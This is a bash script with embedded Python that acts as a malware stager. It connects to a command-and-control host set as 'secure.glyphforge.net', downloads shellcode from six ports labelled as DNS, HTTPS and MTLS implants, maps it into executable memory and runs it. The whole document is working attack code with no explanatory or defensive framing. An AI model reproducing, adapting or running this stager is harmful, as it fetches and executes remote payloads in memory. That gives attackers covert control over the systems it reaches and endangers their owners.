#!/bin/bash

# TCP stager function - connects, reads 4 byte size header, reads shellcode, executes in memory
tcp_stage() {
    local host=$1
    local port=$2
    local name=$3

    python3 - <<EOF
import socket, struct, os, ctypes, sys

def stage(host, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((host, port))
        
        # Read 4 byte size header
        size_data = s.recv(4)
        if len(size_data) < 4:
            return False
        size = struct.unpack('<I', size_data)[0]
        
        # Read shellcode
        shellcode = b''
        while len(shellcode) < size:
            chunk = s.recv(size - len(shellcode))
            if not chunk:
                break
            shellcode += chunk
        s.close()

        # Execute shellcode in memory
        lib = ctypes.CDLL(None)
        sc = ctypes.create_string_buffer(shellcode)
        ptr = lib.mmap(0, len(shellcode), 0x7, 0x22, -1, 0)  # PROT_READ|WRITE|EXEC
        ctypes.memmove(ptr, sc, len(shellcode))
        func = ctypes.cast(ptr, ctypes.CFUNCTYPE(None))
        func()
        return True
    except Exception as e:
        return False

stage("$host", $port)
EOF
}

C2="secure.glyphforge.net"

echo "[*] Staging implants..."

# Linux DNS
tcp_stage $C2 1111 "linuxDNS_B"
tcp_stage $C2 1112 "linuxDNS_S"

# Linux HTTPS
tcp_stage $C2 1221 "linuxHTTP_B"
tcp_stage $C2 1222 "linuxHTTP_S"

# Linux MTLS
tcp_stage $C2 1331 "linuxMTLS_B"
tcp_stage $C2 1332 "linuxMTLS_S"

echo "[*] Done"
